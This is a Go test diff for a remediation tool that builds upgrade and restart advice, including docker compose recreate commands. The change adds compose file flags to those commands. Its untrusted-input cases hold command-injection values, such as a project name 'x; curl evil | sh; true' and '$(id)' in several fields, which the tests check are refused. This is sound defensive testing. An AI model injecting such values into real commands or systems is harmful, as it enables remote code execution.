@@ -23,7 +23,7 @@ func remediationInventory() *inventory.Inventory {
 			{ID: "proc:php", Kind: inventory.KindProcess, Name: "php-fpm8.2", Units: []string{"php8.2-fpm.service"}, Origins: []string{libsslID}},
 			{ID: "proc:shop", Kind: inventory.KindProcess, Name: "node", Units: []string{"shop.service"}, Origins: []string{libsslID, "appdir:/srv/shop"}},
 			{ID: "proc:api", Kind: inventory.KindProcess, Name: "api", Units: []string{"user@1000.service"}, Origins: []string{apiID, libsslID}},
-			{ID: "container:shop-web-1", Kind: inventory.KindContainer, Name: "shop-web-1", Compose: &inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop"}, Origins: []string{imageID}},
+			{ID: "container:shop-web-1", Kind: inventory.KindContainer, Name: "shop-web-1", Compose: &inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"/srv/shop/compose.yml"}}, Origins: []string{imageID}},
 			{ID: "container:cache", Kind: inventory.KindContainer, Name: "cache", Origins: []string{imageID}},
 		},
 		Origins: []inventory.Origin{
@@ -58,7 +58,7 @@ func TestRemediation(t *testing.T) {
 		{"binary", f(apiID, "golang.org/x/net", "v0.1.0", "fixed", "v0.17.0"), "Replace or rebuild /opt/api/api with golang.org/x/net v0.17.0 or later, then restart api."},
 		{"app directory, several fix versions", f("appdir:/srv/shop", "minimist", "1.2.5", "fixed", "0.2.4", "1.2.6"), "Upgrade minimist in /srv/shop to 0.2.4 or 1.2.6, then restart shop.service."},
 		{"image, with and without Compose", f(imageID, "libssl3", "3.0.11-1~deb12u2", "fixed", "3.0.16-1~deb12u1"),
-			"Rebuild ghcr.io/acme/shop:2026.11.3 or pull a newer image with libssl3 3.0.16-1~deb12u1 or later, then recreate the containers cache, shop-web-1 (docker compose -p shop --project-directory /srv/shop up -d --force-recreate --no-deps web)."},
+			"Rebuild ghcr.io/acme/shop:2026.11.3 or pull a newer image with libssl3 3.0.16-1~deb12u1 or later, then recreate the containers cache, shop-web-1 (docker compose -p shop --project-directory /srv/shop -f /srv/shop/compose.yml up -d --force-recreate --no-deps web)."},
 	}
 	for _, c := range cases {
 		if got := r.line(c.f); got != c.want {
@@ -95,24 +95,27 @@ func TestRemediationKernelUpstreamAndArch(t *testing.T) {
 // The Compose labels can come from the image, so a name that breaks Compose's rules never reaches
 // the command, and the container is only named.
 func TestRemediationComposeUntrusted(t *testing.T) {
+	files := []string{"/srv/shop/compose.yml"}
 	cases := []struct {
 		name string
 		c    inventory.Compose
 		want string
 	}{
-		{"shell in the project", inventory.Compose{Project: "x; curl evil | sh; true", Service: "web"}, "the container app"},
-		{"upper case project", inventory.Compose{Project: "Shop", Service: "web"}, "the container app"},
-		{"project starts with a dash", inventory.Compose{Project: "-shop", Service: "web"}, "the container app"},
-		{"shell in the service", inventory.Compose{Project: "shop", Service: "web$(id)"}, "the container app"},
-		{"service starts with a dot", inventory.Compose{Project: "shop", Service: ".web"}, "the container app"},
-		{"no service", inventory.Compose{Project: "shop"}, "the container app"},
-		{"no directory", inventory.Compose{Project: "shop_2", Service: "Web.1"},
-			"the container app (docker compose -p shop_2 up -d --force-recreate --no-deps Web.1)"},
-		{"directory with a space", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/my shop"}, "the container app"},
-		{"relative directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "srv/shop"}, "the container app"},
-		{"directory with shell", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/$(id)"}, "the container app"},
-		{"plain directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop-2.0/c++_x"},
-			"the container app (docker compose -p shop --project-directory /srv/shop-2.0/c++_x up -d --force-recreate --no-deps web)"},
+		{"shell in the project", inventory.Compose{Project: "x; curl evil | sh; true", Service: "web", ConfigFiles: files}, "the container app"},
+		{"upper case project", inventory.Compose{Project: "Shop", Service: "web", ConfigFiles: files}, "the container app"},
+		{"project starts with a dash", inventory.Compose{Project: "-shop", Service: "web", ConfigFiles: files}, "the container app"},
+		{"shell in the service", inventory.Compose{Project: "shop", Service: "web$(id)", ConfigFiles: files}, "the container app"},
+		{"service starts with a dot", inventory.Compose{Project: "shop", Service: ".web", ConfigFiles: files}, "the container app"},
+		{"no service", inventory.Compose{Project: "shop", ConfigFiles: files}, "the container app"},
+		{"no directory and no compose files", inventory.Compose{Project: "shop", Service: "web"}, "the container app"},
+		{"no compose files", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop"}, "the container app"},
+		{"no directory", inventory.Compose{Project: "shop_2", Service: "Web.1", ConfigFiles: files},
+			"the container app (docker compose -p shop_2 -f /srv/shop/compose.yml up -d --force-recreate --no-deps Web.1)"},
+		{"directory with a space", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/my shop", ConfigFiles: files}, "the container app"},
+		{"relative directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "srv/shop", ConfigFiles: files}, "the container app"},
+		{"directory with shell", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/$(id)", ConfigFiles: files}, "the container app"},
+		{"plain directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop-2.0/c++_x", ConfigFiles: []string{"/srv/shop-2.0/c++_x/compose.yml"}},
+			"the container app (docker compose -p shop --project-directory /srv/shop-2.0/c++_x -f /srv/shop-2.0/c++_x/compose.yml up -d --force-recreate --no-deps web)"},
 		{"compose files", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"/srv/shop/compose.yml", "/srv/shop/compose.prod.yml"}},
 			"the container app (docker compose -p shop --project-directory /srv/shop -f /srv/shop/compose.yml -f /srv/shop/compose.prod.yml up -d --force-recreate --no-deps web)"},
 		{"compose file with shell", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"/srv/shop/compose.yml", "/srv/shop/$(id).yml"}}, "the container app"},
@@ -185,7 +188,7 @@ func TestRemediationRestartsPID1(t *testing.T) {
 		restart string
 	}{
 		{"systemd with user managers", osrel.Fedora, "systemd", "systemd", []int{1, 1201}, "dnf upgrade openssl",
-			"sshd, systemd (systemctl daemon-reexec; each logged-in user: systemctl --user daemon-reexec)"},
+			"sshd, systemd (systemctl daemon-reexec; for each user manager: systemctl --user -M <user>@ daemon-reexec)"},
 		{"systemd alone", osrel.Fedora, "systemd", "systemd", []int{1}, "dnf upgrade openssl", "sshd, systemd (systemctl daemon-reexec)"},
 		{"systemd, init unknown", osrel.Fedora, "unknown", "systemd", []int{1}, "dnf upgrade openssl", "sshd, systemd (systemctl daemon-reexec)"},
 		{"systemd under another name", osrel.Fedora, "systemd", "init", []int{1}, "dnf upgrade openssl", "sshd, systemd (systemctl daemon-reexec)"},
